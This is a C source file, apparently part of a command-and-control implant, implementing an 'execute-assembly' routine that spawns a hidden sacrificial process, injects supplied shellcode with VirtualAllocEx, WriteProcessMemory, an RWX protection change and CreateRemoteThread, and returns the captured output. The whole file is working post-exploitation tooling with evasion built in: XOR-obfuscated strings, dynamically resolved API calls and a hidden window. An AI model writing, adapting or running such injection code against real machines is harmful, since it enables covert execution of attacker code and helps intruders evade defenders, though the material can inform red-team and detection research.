#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include "assembly.h"
#include "obf.h"
#include "obf_strings.h"
#include "../../include/dynapi.h"
#include "../../include/mini_std.h"

int exec_assembly(const uint8_t *shellcode, uint32_t sc_len,
                  const wchar_t *spawnto,
                  char *output, int output_size)
{
    output[0] = '\0';
    int total = 0;

    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hRead = NULL, hWrite = NULL;
    if (!fnCreatePipe(&hRead, &hWrite, &sa, 0)) {
        char _e[ENC_EXEC_ASM_ERR_PIPE_LEN + 1];
        xor_dec(_e, ENC_EXEC_ASM_ERR_PIPE, ENC_EXEC_ASM_ERR_PIPE_LEN);
        _snprintf(output, output_size - 1, "%s", _e);
        return -1;
    }
    fnSetHandleInformation(hRead, 1 /*HANDLE_FLAG_INHERIT*/, 0);

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = NULL;

    PROCESS_INFORMATION pi = {0};

    if (!fnCreateProcessW(spawnto, NULL, NULL, NULL, TRUE,
                          CREATE_SUSPENDED | CREATE_NO_WINDOW,
                          NULL, NULL, &si, &pi)) {
        char _e[ENC_EXEC_ASM_ERR_PROC_LEN + 1];
        xor_dec(_e, ENC_EXEC_ASM_ERR_PROC, ENC_EXEC_ASM_ERR_PROC_LEN);
        _snprintf(output, output_size - 1, "%s (error %lu)", _e, fnGetLastError());
        fnCloseHandle2(hRead);
        fnCloseHandle2(hWrite);
        return -1;
    }

    fnCloseHandle2(hWrite);
    hWrite = NULL;

    LPVOID remote = fnVirtualAllocEx(pi.hProcess, NULL, sc_len,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (!remote) goto inject_fail;

    if (!fnWriteProcessMemory(pi.hProcess, remote, shellcode, sc_len, NULL))
        goto inject_fail;

    DWORD oldProt;
    if (!fnVirtualProtectEx(pi.hProcess, remote, sc_len,
                            PAGE_EXECUTE_READWRITE, &oldProt))
        goto inject_fail;

    HANDLE hThread = fnCreateRemoteThread(pi.hProcess, NULL, 0,
                                          (LPTHREAD_START_ROUTINE)remote,
                                          NULL, 0, NULL);
    if (!hThread) {
        char _e[ENC_EXEC_ASM_ERR_THREAD_LEN + 1];
        xor_dec(_e, ENC_EXEC_ASM_ERR_THREAD, ENC_EXEC_ASM_ERR_THREAD_LEN);
        _snprintf(output, output_size - 1, "%s", _e);
        fnTerminateProcess(pi.hProcess, 1);
        fnCloseHandle2(pi.hProcess);
        fnCloseHandle2(pi.hThread);
        fnCloseHandle2(hRead);
        return -1;
    }

    DWORD bytesRead;
    ULONGLONG t0 = fnGetTickCount64();
    int timed_out = 0;

    while (total < output_size - 1) {
        DWORD avail = 0;
        fnPeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL);

        if (avail > 0) {
            DWORD toRead = (DWORD)(output_size - 1 - total);
            if (avail < toRead) toRead = avail;
            if (!fnReadFile(hRead, output + total, toRead, &bytesRead, NULL)
                || bytesRead == 0)
                break;
            total += (int)bytesRead;
            continue;
        }

        DWORD wr = fnWaitForSingleObject(hThread, 200);
        if (wr == 0 /* WAIT_OBJECT_0 */) {
            for (;;) {
                avail = 0;
                fnPeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL);
                if (avail == 0) break;
                DWORD toRead = (DWORD)(output_size - 1 - total);
                if (avail < toRead) toRead = avail;
                if (toRead == 0) break;
                if (!fnReadFile(hRead, output + total, toRead, &bytesRead, NULL)
                    || bytesRead == 0)
                    break;
                total += (int)bytesRead;
            }
            break;
        }

        if (fnGetTickCount64() - t0 > EXEC_ASM_TIMEOUT_MS) {
            timed_out = 1;
            break;
        }
    }
    output[total] = '\0';

    if (timed_out) {
        char _t[ENC_EXEC_ASM_TIMEOUT_LEN + 1];
        xor_dec(_t, ENC_EXEC_ASM_TIMEOUT, ENC_EXEC_ASM_TIMEOUT_LEN);
        if (total + ENC_EXEC_ASM_TIMEOUT_LEN < output_size - 1) {
            memcpy(output + total, _t, ENC_EXEC_ASM_TIMEOUT_LEN);
            total += ENC_EXEC_ASM_TIMEOUT_LEN;
            output[total] = '\0';
        }
    }

    fnTerminateProcess(pi.hProcess, 0);
    fnCloseHandle2(hThread);
    fnCloseHandle2(pi.hProcess);
    fnCloseHandle2(pi.hThread);
    fnCloseHandle2(hRead);
    return total;

inject_fail:
    {
        char _e[ENC_EXEC_ASM_ERR_INJECT_LEN + 1];
        xor_dec(_e, ENC_EXEC_ASM_ERR_INJECT, ENC_EXEC_ASM_ERR_INJECT_LEN);
        _snprintf(output, output_size - 1, "%s", _e);
    }
    fnTerminateProcess(pi.hProcess, 1);
    fnCloseHandle2(pi.hProcess);
    fnCloseHandle2(pi.hThread);
    fnCloseHandle2(hRead);
    return -1;
}
